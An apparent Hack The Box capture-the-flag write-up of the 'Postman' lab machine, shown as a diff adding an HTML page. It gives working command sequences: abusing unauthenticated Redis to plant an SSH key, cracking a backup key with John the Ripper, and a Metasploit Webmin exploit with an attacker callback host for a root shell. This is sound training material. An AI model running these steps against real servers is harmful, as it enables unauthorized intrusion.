@@ -1,0 +1,122 @@
+I"!!<p><strong><center>Ref°: HTB-01-Machine</center></strong></p>
+
+<p>— Postman is a Linux machine that highlights the exploitation of the RCE on the Redis service to gain access and allow to enumerate to escalate our privileges through a found and cracked backup ssh key. That to get Flag user.</p>
+
+<p>A CVE is present in Webmin service to get root privilege and our user have sufficiently right to exploit it through Metasploit module. That to get Flag root.</p>
+
+<p><img src="/assets/images/postman/HTB-Information-Postman.png" alt="Desktop View" /></p>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="check-all-services">Check all services</h3>
+<hr />
+
+<p>We find interesting services: <code class="language-plaintext highlighter-rouge">ssh</code>, <code class="language-plaintext highlighter-rouge">web</code>, <code class="language-plaintext highlighter-rouge">redis</code> and <code class="language-plaintext highlighter-rouge">webmin</code>.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.160 <span class="nt">-p-</span>
+</code></pre></div></div>
+
+<h3 id="redis">Redis</h3>
+<hr />
+
+<p>Access to the service Redis is not protected by password.</p>
+
+<h3 id="web">Web</h3>
+<hr />
+
+<p>Webmin run on the web service in version <code class="language-plaintext highlighter-rouge">1.910</code>.</p>
+
+<h3 id="vulnerabilities">Vulnerabilities</h3>
+<hr />
+
+<p>Redis is not protected by password and we can access with telnet command. We can write and push our SSH Public Key file in authorized_keys. After we are the possibility to logging on to the victim machine through SSH.</p>
+
+<p>The service Webmin present two CVE : 2006-3392 and 2019-12840. The second is more interesting because we can execute arbitrary commands with root privileges via the data parameter to update.cgi. But we need to have a user authorized to the “Package Updates” module.</p>
+
+<p>Reference - exploit CVE : <a href="https://www.cvedetails.com/cve/CVE-2019-12840/">https://www.cvedetails.com/cve/CVE-2019-12840/</a></p>
+
+<p>Metasploit module exists.</p>
+
+<h2 id="2foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
+<h3 id="ssh-authorized-keys-from-rce-execution">SSH Authorized Keys from RCE Execution</h3>
+<hr />
+<p>Reference - exploit RCE : <a href="https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html">https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>sh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 2048
+<span class="gp">$</span><span class="w"> </span><span class="o">(</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span> <span class="nb">cat </span>postman.pub<span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">&gt;</span> foo.txt
+<span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /root/.ssh/foo.txt | redis-cli <span class="nt">-h</span> 10.10.10.160 <span class="nt">-x</span> <span class="nb">set </span>s-key
+<span class="go">
+</span><span class="gp">$</span><span class="w"> </span>telnet 10.10.10.160 6379
+<span class="gp">&gt;</span><span class="w"> </span>config get <span class="nb">dir</span>
+<span class="gp">&gt;</span><span class="w"> </span>config <span class="nb">set dir</span> /var/lib/redis/.ssh
+<span class="gp">&gt;</span><span class="w"> </span>config <span class="nb">set </span>dbfilename authorized_keys
+<span class="gp">&gt;</span><span class="w"> </span>save
+<span class="gp">&gt;</span><span class="w"> </span>quit
+<span class="go">
+</span><span class="gp">$</span><span class="w"> </span>ssh redis@10.10.10.160 <span class="nt">-i</span> postman
+</code></pre></div></div>
+
+<p><img src="/assets/images/postman/HTB-Images-redisrce.png" alt="Desktop View" /></p>
+
+<p>The exploitation is successful and we have gained a foothold.</p>
+
+<h2 id="3-lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[3] Lateral Movement - Move through environment</span></strong></h2>
+<h3 id="cracking-password">Cracking Password</h3>
+<hr />
+<p>With <code class="language-plaintext highlighter-rouge">locate command</code> we found a backup of ssh key and its owner is Matt.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>locate id_rsa
+<span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /opt/
+</code></pre></div></div>
+
+<p><img src="/assets/images/postman/HTB-Images-sshkey.png" alt="Desktop View" /></p>
+
+<p>We retrieve the private key to exploit it with JohnTheRipper on our attacking machine.</p>
+
+<p>Reference - johntheripper tool : <a href="https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c">https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>./ssh2john.py ~/.ssh/Matt <span class="o">&gt;</span> Matt.hash
+<span class="gp">$</span><span class="w"> </span>/usr/sbin/john <span class="nt">--wordlist</span><span class="o">=</span>/root/Documents/wordlist/rockyou.txt Matt.hash
+</code></pre></div></div>
+
+<p>We crack the password of the user Matt : <code class="language-plaintext highlighter-rouge">computer2008</code>.</p>
+
+<p>We cannot access in ssh with this user due to a restriction in the ssh configuration file.
+But we have the possibility to escalate with the <code class="language-plaintext highlighter-rouge">su command</code> from our victim machine.</p>
+
+<h2 id="4-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[4] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="cve-2019-12840-exploitation">CVE 2019-12840 Exploitation</h3>
+<hr />
+<p>Matt user have access on Webmin and he have sufficiently right on <code class="language-plaintext highlighter-rouge">Package Updates</code> module to execute CVE 2019-12840 and obtain root privilege.</p>
+
+<p><img src="/assets/images/postman/HTB-Images-SoftwarePackage.png" alt="Desktop View" /></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>msfconsole
+<span class="gp">msf5 &gt;</span><span class="w"> </span>search webmin
+<span class="gp">msf5 &gt;</span><span class="w"> </span>use exploit/linux/http/webmin_packageup_rce
+<span class="gp">msf5 &gt;</span><span class="w"> </span>show options
+<span class="gp">msf5 &gt;</span><span class="w"> </span><span class="nb">set </span>username Matt
+<span class="gp">msf5 &gt;</span><span class="w"> </span><span class="nb">set </span>password computer2008
+<span class="gp">msf5 &gt;</span><span class="w"> </span><span class="nb">set </span>lhost 10.10.15.122
+<span class="gp">msf5 &gt;</span><span class="w"> </span><span class="nb">set </span>rhost 10.10.10.160
+<span class="gp">msf5 &gt;</span><span class="w"> </span><span class="nb">set </span>ssl <span class="nb">true</span>
+<span class="gp">msf5 &gt;</span><span class="w"> </span>check
+<span class="gp">msf5 &gt;</span><span class="w"> </span>exploit
+<span class="go">
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">root
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
+</code></pre></div></div>
+
+<p>We have compromise Postman machine.</p>
+
+<hr />
+
+<h2 id="trophy"><strong><center>Trophy</center></strong></h2>
+
+<blockquote>
+  <p><strong>A hacker does for love what others would not do for money.</strong></p>
+
+  <p>Laura Creighton</p>
+</blockquote>
+:ET
